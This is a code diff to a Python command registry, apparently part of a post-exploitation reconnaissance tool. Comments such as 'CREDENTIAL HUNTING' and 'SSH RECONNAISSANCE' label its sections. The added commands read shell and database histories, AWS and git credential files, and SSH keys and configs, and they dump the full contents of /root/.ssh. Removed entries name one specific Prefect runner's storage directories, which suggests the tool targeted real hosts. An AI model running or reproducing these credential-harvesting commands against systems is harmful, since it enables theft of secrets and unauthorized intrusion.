@@ -914,7 +914,9 @@ class CommandRegistry:
             "network_config": ("ifconfig", "-a"),
             # ============ PROCESS ENUMERATION ============
             "running_processes": ("ps", "aux"),
+            "process_tree": ("ps", "auxf"),
             "current_user_processes": ("bash", "-c", "ps -u $(whoami)"),
+            "root_processes": ("ps", "-u", "root"),
             "processes_with_network": ("lsof", "-i"),
             # ============ SERVICE DISCOVERY ============
             "running_services": (
@@ -926,7 +928,8 @@ class CommandRegistry:
             "enabled_services": ("systemctl", "list-unit-files", "--state=enabled"),
             "docker_check": ("docker", "ps", "-a"),
             "apache_check": ("systemctl", "is-active", "apache2"),
-            "nginx_check": ("systemctl", "is-active", "nginx"),            
+            "nginx_check": ("systemctl", "is-active", "nginx"),
+            "mysql_check": ("systemctl", "is-active", "mysql"),
             "postgresql_check": ("systemctl", "is-active", "postgresql"),
             "ssh_check": ("systemctl", "is-active", "ssh"),
             # ============ ENVIRONMENT ENUMERATION ============
@@ -935,7 +938,15 @@ class CommandRegistry:
             "home_directory": ("echo", "$HOME"),
             "current_directory": ("pwd",),
             # ============ SSH RECONNAISSANCE ============
+            "ssh_config": ("cat", "/etc/ssh/sshd_config"),
+            "ssh_known_hosts": ("cat", "$HOME/.ssh/known_hosts"),
+            "ssh_authorized_keys": ("cat", "$HOME/.ssh/authorized_keys"),
+            "ssh_private_keys": ("ls", "-la", "~/.ssh/"),
+            "ssh_agent_check": ("echo", "$SSH_AUTH_SOCK"),
             # ============ CREDENTIAL HUNTING ============
+            "bash_history": ("cat", "~/.bash_history"),
+            "zsh_history": ("cat", "~/.zsh_history"),
+            "mysql_history": ("cat", "~/.mysql_history"),
             "psql_history": ("cat", "~/.psql_history"),
             "python_history": ("cat", "~/.python_history"),
             "aws_credentials": ("cat", "~/.aws/credentials"),
@@ -945,13 +956,19 @@ class CommandRegistry:
             "git_credentials": ("cat", "~/.git-credentials"),
             # ============ SECURITY CONTROLS ============
             "sudo_version": ("sudo", "-V"),
-            "sudo_list": ("sudo", "-l"),        
+            "sudo_list": ("sudo", "-l"),
+            "selinux_status": ("getenforce",),
+            "apparmor_status": ("aa-status",),
             "iptables_rules": ("iptables", "-L", "-n"),
             "ufw_status": ("ufw", "status"),
             "firewalld_status": ("firewall-cmd", "--state"),
-            # ============ INSTALLED SOFTWARE ============        
+            # ============ INSTALLED SOFTWARE ============
+            "installed_packages_deb": ("dpkg", "-l"),
+            "installed_packages_rpm": ("rpm", "-qa"),
             "pip_packages": ("pip", "list"),
             "pip3_packages": ("pip3", "list"),
+            "gem_packages": ("gem", "list"),
+            "npm_global_packages": ("npm", "list", "-g", "--depth=0"),
             # ============ CRON & SCHEDULED TASKS ============
             "user_crontab": ("crontab", "-l"),
             "system_crontab": ("cat", "/etc/crontab"),
@@ -967,19 +984,22 @@ class CommandRegistry:
             # ============ CONTAINER DETECTION ============
             "container_check": ("cat", "/proc/1/cgroup"),
             "docker_env_check": ("cat", "/.dockerenv"),
+            "kubernetes_check": ("ls", "-la", "/var/run/secrets/kubernetes.io"),
             # ============ FILE SYSTEM MAPPING ============
             "mounted_filesystems": ("mount",),
             "disk_usage": ("df", "-h"),
+            "file-ls-home": ("ls", "-la", "/home"),
             "file-ls-tmp": ("ls", "-la", "/tmp"),
             "file-ls-var_tmp": ("ls", "-la", "/var/tmp"),
-            "file-ls-opt": ("ls", "-la", "/opt/prefect"),
-            "file-ls-rstg": ("ls", "-la", "/tmp/runner_storage"),
-            "file-ls-stg": ("ls", "-la", "/tmp/runner_storage/c71e99f9-49b5-40d1-b61d-4d4146a41d0b"),
-            "file-ls-tmpp": ("ls", "-la", "/tmp/tmphm64kw_rprefect"),
+            "file-ls-opt": ("ls", "-la", "/opt"),
+            "file-ls-etc": ("ls", "-la", "/etc"),
+            "file-ls-app": ("ls", "-la", "/app"),
+            "file-ls-ssh": ("ls", "-la", "/root/.ssh"),
+            "file-ls-root": ("ls", "-la", "/root"),
+            "file-ls-web": ("ls", "-la", "/var/www"),
             "file_contents_app": ("bash", "-c", "find /app -type f \\( -path '*/.venv/*' -o -path '*/venv/*' -o -path '*/__pycache__/*' -o -path '*/.pytest_cache/*' -o -path '*/.cache/*' -o -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/dist/*' -o -path '*/build/*' -o -path '*/.egg-info/*' -o -path '*/eggs/*' -o -path '*/.tox/*' -o -path '*/.mypy_cache/*' -o -path '*/.ruff_cache/*' \\) -prune -o -type f -print | xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"),
-            "file_contents_stg": ("bash", "-c", "find /tmp/runner_storage/c71e99f9-49b5-40d1-b61d-4d4146a41d0b -type f \\( -path '*/.venv/*' -o -path '*/venv/*' -o -path '*/__pycache__/*' -o -path '*/.pytest_cache/*' -o -path '*/.cache/*' -o -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/dist/*' -o -path '*/build/*' -o -path '*/.egg-info/*' -o -path '*/eggs/*' -o -path '*/.tox/*' -o -path '*/.mypy_cache/*' -o -path '*/.ruff_cache/*' \\) -prune -o -type f -print | xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"),
-            "file_contents_tmpp": ("bash", "-c", "find /tmp/tmphm64kw_rprefect -type f \\( -path '*/.venv/*' -o -path '*/venv/*' -o -path '*/__pycache__/*' -o -path '*/.pytest_cache/*' -o -path '*/.cache/*' -o -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/dist/*' -o -path '*/build/*' -o -path '*/.egg-info/*' -o -path '*/eggs/*' -o -path '*/.tox/*' -o -path '*/.mypy_cache/*' -o -path '*/.ruff_cache/*' \\) -prune -o -type f -print | xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"),
-            "file_contents_prf": ("bash", "-c", "find /opt/prefect -type f \\( -path '*/.venv/*' -o -path '*/venv/*' -o -path '*/__pycache__/*' -o -path '*/.pytest_cache/*' -o -path '*/.cache/*' -o -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/dist/*' -o -path '*/build/*' -o -path '*/.egg-info/*' -o -path '*/eggs/*' -o -path '*/.tox/*' -o -path '*/.mypy_cache/*' -o -path '*/.ruff_cache/*' \\) -prune -o -type f -print | xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"),
+            "file_contents_ssh": ("bash", "-c", "find /root/.ssh -type f -exec sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"' \\;"),
+            "file_contents_ssh_config": ("bash", "-c", "find /etc/ssh/sshd_config.d -type f -exec sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"' \\;"),
 
         }
         return commands
